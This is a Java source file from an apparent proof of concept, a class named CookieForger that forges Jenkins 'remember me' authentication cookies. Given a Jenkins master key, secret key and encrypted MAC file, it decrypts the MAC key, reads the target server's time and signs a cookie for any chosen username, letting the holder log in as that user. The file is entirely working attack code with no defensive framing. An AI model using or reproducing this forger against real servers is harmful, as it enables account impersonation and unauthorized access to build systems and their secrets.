package poc;

import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import javax.crypto.SecretKey;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.CipherOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.ByteArrayInputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Calendar;
import java.util.TimeZone;



public final class CookieForger {
    public String jenkins_server;
    public String master_key;
    public String secret_key;
    public byte[] mac;

    private static final String MAGIC = "::::MAGIC::::";
    private static final byte[] MAGIC_BYTES = MAGIC.getBytes(StandardCharsets.UTF_8);

    public CookieForger(String jenkins_server, String master_key, String secret_key, byte[] mac) {
        this.jenkins_server = jenkins_server;
        this.master_key = master_key;
        this.secret_key = secret_key;
        this.mac = mac;
    }

    private static long getServerTimeInMillis(String jenkinsUrl) {
        long serverDate = 0;
        try {
            URL url = new URL(jenkinsUrl);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.connect();

            // Get the Date from response headers
            serverDate = connection.getDate();

            if (serverDate == 0) {
                // If the Date header is not found, return current GMT time in milliseconds
                serverDate = getCurrentTimeInMillisGMT();
            }

        } catch (Exception e) {
            // In case of any exception, return current GMT time in milliseconds
            e.printStackTrace();
            serverDate = getCurrentTimeInMillisGMT();
        }

        return serverDate;
    }

    private static long getCurrentTimeInMillisGMT() {
        // Get the current time in GMT
        Calendar calendar = Calendar.getInstance(TimeZone.getTimeZone("GMT"));
        return calendar.getTimeInMillis();
    }

    public String cookieFor(UserInfo userinfo) {
        try {
            long serverCurrentTime = getServerTimeInMillis(this.jenkins_server);
            long tokenExpiryTime = serverCurrentTime + 3600000; // 1 hour from now
            String tokenSignature = makeTokenSignature(tokenExpiryTime, userinfo.name, userinfo.seed, this.secret_key);
            String cookie = userinfo.name + ":" + Long.toString(tokenExpiryTime) + ":" + tokenSignature;
            String cookieBase64 = Base64.getEncoder().encodeToString(cookie.getBytes());
            return cookieBase64;
        } catch(Exception e){
            System.out.println("Exception: " + e.getMessage());
            e.printStackTrace();
        }
        return null;
    }


    // Function to generate the token signature
    private String makeTokenSignature(long tokenExpiryTime, String username, String userSeed, String key) throws Exception {
        // Combine all components to form the token
        String token = String.join(":", username, Long.toString(tokenExpiryTime), userSeed, key);
        // Return the MAC (Message Authentication Code) of the token
        byte[] macKey = getMacKey();
        return generateHMAC(token, macKey);
    }


    private byte[] getMacKey() throws Exception {
        SecretKey masterKey = toAes128Key(this.master_key);
        Cipher sym = Cipher.getInstance("AES");
        sym.init(Cipher.DECRYPT_MODE, masterKey);
        //byte[] macbytes = this.mac.getBytes(StandardCharsets.UTF_8);

        InputStream is = new ByteArrayInputStream(this.mac);
        CipherInputStream cis = new CipherInputStream(is, sym);
        byte[] bytes = cis.readAllBytes();

        if (bytes.length < MAGIC_BYTES.length) {
            throw new Exception("MAGIC error");
        }
        for (int i = 0; i < MAGIC_BYTES.length; i++) {
            if (bytes[bytes.length - MAGIC_BYTES.length + i] != MAGIC_BYTES[i]) {
                throw new Exception("MAGIC error");
            }
        }
        byte[] result = new byte[bytes.length - MAGIC_BYTES.length];
        System.arraycopy(bytes, 0, result, 0, result.length);
        return result;
    }




    // Method to generate the HMAC (MAC) of the token
    protected String generateHMAC(String data, byte[] key) {
        try {
            // Define the HMAC algorithm (e.g., HMAC-SHA256)
            Mac mac = Mac.getInstance("HmacSHA256");

            // Create a secret key from the provided key
            //SecretKeySpec secretKeySpec = new SecretKeySpec(key.getBytes(StandardCharsets.UTF_8), "HmacSHA256");
            SecretKeySpec secretKeySpec = new SecretKeySpec(key, "HmacSHA256");

            // Initialize the MAC instance with the secret key
            mac.init(secretKeySpec);

            // Compute the MAC value
            byte[] macBytes = mac.doFinal(data.getBytes(StandardCharsets.UTF_8));

            // Encode the MAC value to a Base64 string and return it
            return bytesToHex(macBytes);
        } catch (Exception e) {
            throw new RuntimeException("Failed to generate HMAC", e);
        }
    }

    private SecretKey toAes128Key(String s) {
        try {
            // turn secretKey into 256 bit hash
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            digest.reset();
            digest.update(s.getBytes(StandardCharsets.UTF_8));

            // Due to the stupid US export restriction JDK only ships 128bit version.
            return new SecretKeySpec(digest.digest(), 0, 128 / 8, "AES");
        } catch (NoSuchAlgorithmException e) {
            throw new Error(e);
        }
    }

    private byte[] hexStringToByteArray(String hexString) {
        int len = hexString.length();
        byte[] data = new byte[len / 2];

        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(hexString.charAt(i), 16) << 4)
                                 + Character.digit(hexString.charAt(i+1), 16));
        }

        return data;
    }

    // Method to convert byte array to hex string
    private String bytesToHex(byte[] bytes) {
        StringBuilder hexString = new StringBuilder();
        for (byte b : bytes) {
            String hex = Integer.toHexString(0xff & b);
            if (hex.length() == 1) {
                hexString.append('0');
            }
            hexString.append(hex);
        }
        return hexString.toString();
    }
}
